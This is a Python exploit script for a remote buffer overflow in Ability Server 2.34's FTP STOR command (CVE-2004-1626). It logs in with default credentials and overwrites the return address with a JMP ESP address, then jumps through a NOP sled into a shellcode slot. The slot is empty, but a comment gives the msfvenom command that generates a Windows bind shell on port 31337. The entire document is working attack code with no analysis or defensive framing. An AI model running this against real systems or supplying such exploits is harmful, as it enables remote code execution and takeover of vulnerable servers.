#!/usr/bin/python

###############################################################
#							      #
#   Ability Server 2.34 - FTP 'STOR' Remote Buffer Overflow   #
#       https://nvd.nist.gov/vuln/detail/CVE-2004-1626        #
#							      #
###############################################################

import socket

host = "10.0.20.45"
port = 21

# USER32.dll - JMP ESP: 759A4E2B
eip = '\x2B\x4E\x9A\x75'
eip_offset = 968
nopsled = 16
sc_bytes = 357

padding = 2000 - (eip_offset + 4 + nopsled + sc_bytes)

# msfvenom -b '\x00\xD9\x74\x24\xF4' -p windows/shell_bind_tcp LPORT=31337 -f c
# Payload size: 357 bytes
sc = ("")

buffer = 'A'*eip_offset
buffer += eip
buffer += '\x90'*nopsled
buffer += sc
buffer += '\x90'*padding

print '[+] Buffer size is: ' + str(len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send('USER ftp\r\nPASS ftp\r\n')
print s.recv(1024)
s.send('STOR '+buffer+'\r\n')
print s.recv(1024)
s.close
